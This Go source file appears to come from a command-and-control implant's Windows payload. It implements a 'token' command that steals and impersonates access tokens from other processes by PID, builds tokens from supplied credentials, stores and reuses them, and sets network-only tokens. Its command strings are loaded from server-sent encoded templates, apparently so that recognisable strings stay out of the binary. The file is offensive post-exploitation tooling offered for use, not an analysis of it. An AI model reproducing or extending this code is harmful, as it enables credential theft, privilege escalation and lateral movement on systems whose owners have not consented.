// server/docker/payloads/Windows/action_token_windows.go
//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"strconv"
	"strings"
	"sync"
	"time"
)

// TokenTemplate holds the server-side template for token commands
type TokenTemplate struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

// Shared template storage for all token-related commands
var (
	tokTemplate   []string
	tokTemplateMu sync.RWMutex
)

// SetTokenTemplate stores the template for use by all token commands
func SetTokenTemplate(templates []string) {
	tokTemplateMu.Lock()
	tokTemplate = templates
	tokTemplateMu.Unlock()
}

// tokTpl retrieves a template string by index with mutex protection
func tokTpl(idx int) string {
	tokTemplateMu.RLock()
	defer tokTemplateMu.RUnlock()
	if tokTemplate != nil && idx < len(tokTemplate) {
		return tokTemplate[idx]
	}
	return ""
}

// Token template indices (must match server's common.go)
const (
	// Verbs (451-464)
	idxTokVerbCreate      = 451
	idxTokVerbSteal       = 452
	idxTokVerbStore       = 453
	idxTokVerbUse         = 454
	idxTokVerbImpersonate = 455
	idxTokVerbNetonly     = 456
	idxTokVerbList        = 457
	idxTokVerbStored      = 458
	idxTokVerbCurrent     = 459
	idxTokVerbStatus      = 460
	idxTokVerbRemove      = 461
	idxTokVerbClear       = 462
	idxTokVerbRevert      = 463
	idxTokVerbRev2self    = 464

	// Subcommand actions (465-466)
	idxTokActSet       = 465
	idxTokActProcesses = 466

	// Logon types (467-474)
	idxTokLogonNetwork      = 467
	idxTokLogonBatch        = 468
	idxTokLogonService      = 469
	idxTokLogonNetCleartext = 470
	idxTokLogonNetClear     = 471
	idxTokLogonNewCreds     = 472
	idxTokLogonNewCredsAlt  = 473
	idxTokLogonInteractive  = 474

	// Source identifiers (476-479)
	idxTokSourceStolen  = 476
	idxTokSourceCreated = 477
	idxTokStolenCmp     = 478
	idxTokCreatedCmp    = 479

	// Token types (480-481)
	idxTokTypeImpersonation = 480
	idxTokTypePrimary       = 481

	// Utility strings (482-496)
	idxTokUnknownLower = 482
	idxTokUnknown      = 483
	idxTokBackslash    = 484
	idxTokNewline      = 485
	idxTokUnderscore   = 486
	idxTokSpace        = 487
	idxTokColon        = 488
	idxTokPipe         = 489
	idxTokNone         = 490
	idxTokDots         = 491
	idxTokAtSign       = 492
	idxTokDot          = 493
	idxTokComma        = 494
	idxTokMode0        = 495
	idxTokMode1        = 496

	// Output format strings (497-516)
	idxTokTokenInfo      = 497
	idxTokProcessUser    = 498
	idxTokImpTokenPrefix = 499
	idxTokUserPrefix     = 500
	idxTokSourcePrefix   = 501
	idxTokProcessPrefix  = 502
	idxTokPidPrefix      = 503
	idxTokPidSuffix      = 504
	idxTokLogonPrefix    = 505
	idxTokNoActiveImp    = 506
	idxTokNetOnlyTokPre  = 507
	idxTokOrigUserPre    = 508
	idxTokNetOnlyHdr     = 509
	idxTokActiveNetPre   = 510
	idxTokUserPre2       = 511
	idxTokSourcePre2     = 512
	idxTokProcessPre2    = 513
	idxTokLogonPre2      = 514
	idxTokNetOnlyToksHdr = 515
	idxTokIndent2        = 516
)

// Convenience functions for token verbs with fallbacks
func tokVerbCreate() string {
	if s := tokTpl(idxTokVerbCreate); s != "" {
		return s
	}
	return "create"
}

func tokVerbSteal() string {
	if s := tokTpl(idxTokVerbSteal); s != "" {
		return s
	}
	return "steal"
}

func tokVerbStore() string {
	if s := tokTpl(idxTokVerbStore); s != "" {
		return s
	}
	return "store"
}

func tokVerbUse() string {
	if s := tokTpl(idxTokVerbUse); s != "" {
		return s
	}
	return "use"
}

func tokVerbImpersonate() string {
	if s := tokTpl(idxTokVerbImpersonate); s != "" {
		return s
	}
	return "impersonate"
}

func tokVerbNetonly() string {
	if s := tokTpl(idxTokVerbNetonly); s != "" {
		return s
	}
	return "netonly"
}

func tokVerbList() string {
	if s := tokTpl(idxTokVerbList); s != "" {
		return s
	}
	return "list"
}

func tokVerbStored() string {
	if s := tokTpl(idxTokVerbStored); s != "" {
		return s
	}
	return "stored"
}

func tokVerbCurrent() string {
	if s := tokTpl(idxTokVerbCurrent); s != "" {
		return s
	}
	return "current"
}

func tokVerbStatus() string {
	if s := tokTpl(idxTokVerbStatus); s != "" {
		return s
	}
	return "status"
}

func tokVerbRemove() string {
	if s := tokTpl(idxTokVerbRemove); s != "" {
		return s
	}
	return "remove"
}

func tokVerbClear() string {
	if s := tokTpl(idxTokVerbClear); s != "" {
		return s
	}
	return "clear"
}

func tokVerbRevert() string {
	if s := tokTpl(idxTokVerbRevert); s != "" {
		return s
	}
	return "revert"
}

func tokVerbRev2self() string {
	if s := tokTpl(idxTokVerbRev2self); s != "" {
		return s
	}
	return "rev2self"
}

func tokActSet() string {
	if s := tokTpl(idxTokActSet); s != "" {
		return s
	}
	return "set"
}

func tokActProcesses() string {
	if s := tokTpl(idxTokActProcesses); s != "" {
		return s
	}
	return "processes"
}

func tokDefInteractive() string {
	if s := tokTpl(idxTokLogonInteractive); s != "" {
		return s
	}
	return "interactive"
}

// TokenCommand consolidates all token management functionality
type TokenCommand struct {
	tpl *TokenTemplate
}

func (c *TokenCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// Parse template from command data if present
	if ctx.CurrentCommand.Data != "" {
		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
		if err == nil {
			c.tpl = &TokenTemplate{}
			if json.Unmarshal(decoded, c.tpl) == nil && c.tpl.Templates != nil {
				SetTokenTemplate(c.tpl.Templates)
			}
		}
	}

	if len(args) == 0 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	verb := strings.ToLower(args[0])
	verbArgs := args[1:]

	switch verb {
	// === Token Creation ===
	case tokVerbCreate():
		return c.handleCreate(ctx, verbArgs)

	// === Token Stealing ===
	case tokVerbSteal():
		return c.handleSteal(ctx, verbArgs)
	case tokVerbStore():
		return c.handleStore(ctx, verbArgs)

	// === Token Usage ===
	case tokVerbUse():
		return c.handleUse(ctx, verbArgs)
	case tokVerbImpersonate():
		return c.handleImpersonate(ctx)

	// === Network-Only Management ===
	case tokVerbNetonly():
		return c.handleNetOnly(ctx, verbArgs)

	// === Token Listing/Info ===
	case tokVerbList():
		return c.handleList(ctx, verbArgs)
	case tokVerbStored():
		return c.handleStored(ctx)
	case tokVerbCurrent(), tokVerbStatus():
		return c.handleCurrent(ctx)

	// === Token Cleanup ===
	case tokVerbRemove():
		return c.handleRemove(ctx, verbArgs)
	case tokVerbClear():
		return c.handleClear(ctx)
	case tokVerbRevert(), tokVerbRev2self():
		// Allow both for compatibility
		return c.handleRevert(ctx)

	default:
		return CommandResult{
			Output:      ErrCtx(E2, verb),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}

// ============================================================================
// Token Creation (from make-token)
// ============================================================================

func (c *TokenCommand) handleCreate(ctx *CommandContext, args []string) CommandResult {
	// Delegate to existing MakeTokenCommand logic
	makeToken := &MakeTokenCommand{}

	if len(args) == 0 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Handle 'token create netonly' specially
	if args[0] == tokVerbNetonly() {
		if len(args) < 4 {
			return CommandResult{
				Output:      Err(E1),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}
		return makeToken.createNetOnlyToken(ctx, args[1], args[2], args[3])
	}

	// Regular token creation
	if len(args) < 3 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	userpass := args[0]
	password := args[1]
	tokenName := args[2]
	logonType := tokDefInteractive()
	if len(args) > 3 {
		logonType = args[3]
	}

	return makeToken.createToken(ctx, userpass, password, tokenName, logonType)
}

// ============================================================================
// Token Stealing (from steal-token)
// ============================================================================

func (c *TokenCommand) handleSteal(ctx *CommandContext, args []string) CommandResult {
	stealToken := &StealTokenCommand{}

	if len(args) < 1 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	pid, err := strconv.Atoi(args[0])
	if err != nil {
		return CommandResult{
			Output:      ErrCtx(E2, args[0]),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	name := ""
	netOnly := false

	// Parse additional arguments for name and netonly flag
	for i := 1; i < len(args); i++ {
		if strings.ToLower(args[i]) == tokVerbNetonly() {
			netOnly = true
		} else if name == "" {
			name = args[i]
		}
	}

	return stealToken.stealAndImpersonate(ctx, pid, name, netOnly)
}

func (c *TokenCommand) handleStore(ctx *CommandContext, args []string) CommandResult {
	stealToken := &StealTokenCommand{}

	if len(args) < 2 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	pid, err := strconv.Atoi(args[0])
	if err != nil {
		return CommandResult{
			Output:      ErrCtx(E2, args[0]),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	netOnly := false
	if len(args) > 2 && strings.ToLower(args[2]) == tokVerbNetonly() {
		netOnly = true
	}

	return stealToken.storeToken(ctx, pid, args[1], netOnly)
}

// ============================================================================
// Token Usage
// ============================================================================

func (c *TokenCommand) handleUse(ctx *CommandContext, args []string) CommandResult {
	stealToken := &StealTokenCommand{}

	if len(args) < 1 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	netOnly := false
	if len(args) > 1 && strings.ToLower(args[1]) == tokVerbNetonly() {
		netOnly = true
	}

	return stealToken.useStoredToken(ctx, args[0], netOnly)
}

func (c *TokenCommand) handleImpersonate(ctx *CommandContext) CommandResult {
	makeToken := &MakeTokenCommand{}
	return makeToken.impersonateToken(ctx)
}

// ============================================================================
// Network-Only Management
// ============================================================================

func (c *TokenCommand) handleNetOnly(ctx *CommandContext, args []string) CommandResult {
	stealToken := &StealTokenCommand{}

	if len(args) == 0 {
		return stealToken.showNetOnlyStatus()
	}

	action := strings.ToLower(args[0])
	switch action {
	case tokActSet():
		if len(args) < 2 {
			return CommandResult{
				Output:      Err(E1),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}
		return stealToken.setNetOnlyToken(ctx, args[1])

	case tokVerbClear():
		return stealToken.clearNetOnlyToken(ctx)

	case tokVerbStatus():
		return stealToken.showNetOnlyStatus()

	default:
		return CommandResult{
			Output:      ErrCtx(E2, action),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}

// ============================================================================
// Token Listing/Info
// ============================================================================

func (c *TokenCommand) handleList(ctx *CommandContext, args []string) CommandResult {
	// Check if they want to list processes (token list processes)
	if len(args) > 0 && args[0] == tokActProcesses() {
		stealToken := &StealTokenCommand{}
		return stealToken.listTokens()
	}

	// Otherwise show stored tokens
	return c.handleStored(ctx)
}

func (c *TokenCommand) handleStored(ctx *CommandContext) CommandResult {
	stealToken := &StealTokenCommand{}
	return stealToken.listStoredTokens()
}

func (c *TokenCommand) handleCurrent(ctx *CommandContext) CommandResult {
	stealToken := &StealTokenCommand{}
	return stealToken.getCurrentTokenInfo()
}

// ============================================================================
// Token Cleanup
// ============================================================================

func (c *TokenCommand) handleRemove(ctx *CommandContext, args []string) CommandResult {
	stealToken := &StealTokenCommand{}

	if len(args) < 1 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return stealToken.removeStoredToken(ctx, args[0])
}

func (c *TokenCommand) handleClear(ctx *CommandContext) CommandResult {
	makeToken := &MakeTokenCommand{}
	return makeToken.clearTokens(ctx)
}

func (c *TokenCommand) handleRevert(ctx *CommandContext) CommandResult {
	rev2self := &Rev2SelfCommand{}
	return rev2self.Execute(ctx, []string{})
}
